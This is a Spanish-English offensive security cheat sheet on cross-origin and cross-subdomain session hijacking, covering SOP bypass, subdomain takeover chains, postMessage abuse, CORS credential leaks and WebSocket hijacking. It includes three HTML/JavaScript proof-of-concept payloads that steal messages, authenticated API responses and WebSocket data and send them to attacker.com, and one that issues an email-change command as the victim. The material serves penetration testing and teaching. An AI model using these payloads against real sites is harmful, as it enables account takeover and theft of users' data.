---
aliases:
  - SOP Bypass
  - CSWSH WebSocket Hijacking
  - postMessage Abuse
  - CORS Credential Leak
tags:
  - type/cheatsheet
  - vuln/session-hijacking
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Session Hijacking]]'
  - '[[Cross-Site Request Forgery (CSRF)]]'
  - '[[Subdomain Takeover]]'
---
# Session Hijacking - Cross-Origin y Cross-Subdomain

***

## Same-Origin Policy (SOP) Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Browser bug | Direct SOP bypass | Per-vuln. |
| Subdomain trust abuse | Sub trusts parent y vice versa | Cross-sub. |
| Document.domain manipulation | Old technique — set parent.domain to common | Mostly mitigated modern browsers. |
| `document.domain` legacy bypass | Both pages set to common domain | Deprecated en modern browsers. |
| Iframe bypass via `srcdoc` | Inline content shares origin | Edge. |
| `<object>` / `<embed>` cross-origin | Plugin-based bypass | Legacy Flash / etc. |
| `window.opener` reference | New tab có reference a parent | Edge. |
| WebSocket lacks SOP | WS handshake includes Origin but app may not check | CSWSH. |
| postMessage no Origin check | Cross-origin postMessage | Standard. |
| CORS misconfig | Server reflects Origin → permits credentials | Standard. |
| File:// origin null | Local files have null origin | Edge. |
| Sandboxed iframe Origin null | Sandbox attribute → null Origin | Edge. |
| `data:` URL Origin | data URLs sin origin | Limited. |
| Subdomain con wildcard cookie | Cookie scoped to all subs | Cross-sub abuse. |
| Combine con XSS en sub | Sub XSS reads parent's data via SOP | Cross-sub XSS. |
^sh-cross-sop

___

## Subdomain Takeover Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Stage 1: Identify dangling sub | `*.target.com` con CNAME dangling | See Subdomain Takeover. |
| Stage 2: Claim sub | Atacante owns subdomain | HTTPS valid. |
| Stage 3: Cookie scope abuse | Cookie con `Domain=.target.com` | Sent to all subs. |
| Stage 4: JS reads parent cookies | If not HttpOnly | Direct theft. |
| Stage 5: Cookie tossing | Set malicious cookie en parent | Fixation. |
| OAuth `redirect_uri` whitelist | Sub whitelisted → atacante claims | Code theft. |
| SAML SP / IdP trust | Sub als SP → atacante receives assertions | Federation. |
| CORS subdomain trust | `*.target.com` allowed → fetch with credentials | Data exfil. |
| CSP subdomain whitelist | JS from sub allowed → atacante's malicious JS in main | XSS upgrade. |
| WebSocket hostname trust | WS Origin trust includes subdomain | CSWSH. |
| Cross-frame access | iframe content from sub → reads parent | Edge. |
| Persistent session hijack | Long-lived cookies + permanent sub control | Permanent ATO. |
| See `Subdomain Takeover` for full chain | Comprehensive | Cross-ref. |
^sh-cross-subdomain-takeover

___

## postMessage Handler Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | App listens postMessage cross-origin. Atacante's iframe sends malicious data → app processes. | Cross-origin chat. |
| Listener sin origin check | `window.addEventListener('message', e => process(e.data))` sin `e.origin` validation | Vulnerable. |
| Sensitive data exfil | Atacante's iframe receives postMessage with token | Standard. |
| Atacante iframe injects message | `iframe.contentWindow.postMessage({token:'STEAL'}, '*')` | Direct. |
| Listener echoes data | App responds con sensitive data via postMessage | Disclosure. |
| Listener executes commands | If listener evaluates messages | XSS-like. |
| Combine con OAuth callback | OAuth flows often use postMessage | Federation chain. |
| OpenID Connect implicit | Token in postMessage | Standard. |
| BroadcastChannel API | Same-origin only — different vector | Limited. |
| MessageChannel ports | Cross-origin port abuse | Edge. |
| Combine con XSS | XSS senders postMessage data exfil | Multi-vector. |
| Origin validation TOCTOU | Race condition en origin check | Edge. |
| Wildcard Origin in target | `*` in postMessage target | Loose security. |
^sh-cross-postmessage

### postMessage exfil PoC

```html
<!-- Atacante hostea attacker.com -->
<iframe src="https://target.com/login" id="t"></iframe>
<script>
  // Wait for iframe load
  document.getElementById('t').onload = () => {
    // Listen for any postMessage from target
    window.addEventListener('message', (event) => {
      // Exfil to attacker
      fetch('https://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify({
          origin: event.origin,
          data: event.data
        })
      });
    });
  };
</script>
```

___

## CORS Misconfig Credential Leak

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | CORS server permite atacante origin + Allow-Credentials → atacante's JS makes authenticated cross-origin requests + reads response | Standard. |
| `Access-Control-Allow-Origin: *` con credentials | Browser rejects this combination — but server bug | Edge. |
| Reflected Origin | Server reflects request Origin in response | Common bug. |
| Wildcard subdomain | `*.target.com` allowed | Subdomain takeover combo. |
| Trusted "evil-target.com" | Substring match | Origin validation flaw. |
| Null Origin | Sandboxed iframe → Origin: null | Server may accept. |
| `file://` origin | Some servers accept | Edge. |
| Origin con port confusion | `https://target.com:443` vs default | Edge parsing. |
| Combine con XSS source domain | Sub takeover + CORS trust | Combined. |
| Combine con OAuth | OAuth server CORS | Standard. |
| Bypass via `<script>` tag | If app returns JSON wrapped en JS | JSONP-style abuse. |
| WebSocket allows null check | WS doesn't have CORS — checks Origin manually | Different. |
| Read sensitive API responses | Atacante's JS fetches with `credentials:'include'` | Direct exfil. |
| Trigger sensitive actions | Same idea + state-changing | CSRF + CORS. |
| Internal-only APIs trusted | If `Access-Control-Allow-Origin: *` on internal | Edge. |
^sh-cross-cors

### CORS exfil PoC

```html
<!-- Atacante hostea attacker.com -->
<script>
  fetch('https://target.com/api/user/profile', {
    method: 'GET',
    credentials: 'include'  // sends victim's cookies
  })
  .then(r => r.json())
  .then(data => {
    // Si Access-Control-Allow-Origin: https://attacker.com (reflected)
    // y Access-Control-Allow-Credentials: true → response readable
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

___

## WebSocket Hijacking (CSWSH)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | WebSocket handshake = HTTP request con cookies. Sin Origin check, atacante opens WS to target → cross-origin auth'd connection. | Standard CSWSH. |
| WS sin Origin check | `wss://target/socket` opens with cookies | Direct. |
| Origin null bypass | Sandboxed iframe → Origin: null accepted | Edge. |
| Authenticate via cookies | Cookies sent automatically en WS handshake | Standard. |
| Read incoming WS data | `ws.onmessage = e => exfil(e.data)` | Continuous exfil. |
| Send commands as victim | `ws.send(JSON.stringify({...}))` | Action injection. |
| Subscribe to user channels | If channel-based protocol | Real-time data. |
| Combine con XSS | XSS embeds CSWSH | Persistent. |
| Auth token en URL hash | If WS auth via fragment | Edge. |
| Subprotocol auth bypass | `Sec-WebSocket-Protocol: jwt, eyJ...` | Edge. |
| Combine con CORS | If WS uses CORS-style auth | Mixed. |
| Push notification interception | If WS used for push | Sensitive data. |
| Combine con CSRF | Action via WS sent as victim | Standard. |
| See `CSRF - Tipos Especiales (CSWSH)` | Cross-ref | Reference. |
^sh-cross-websocket

### CSWSH PoC

```html
<!-- Atacante hostea attacker.com -->
<script>
  const ws = new WebSocket('wss://target.com/api/socket');
  
  ws.onopen = () => {
    // Cookies auto-sent during handshake
    // Victim authenticated → atacante's WS authenticated
    
    // Send commands as victim
    ws.send(JSON.stringify({type:'change_email', email:'attacker@evil.com'}));
  };
  
  ws.onmessage = (event) => {
    // Exfil all received data
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: event.data
    });
  };
</script>
```

***
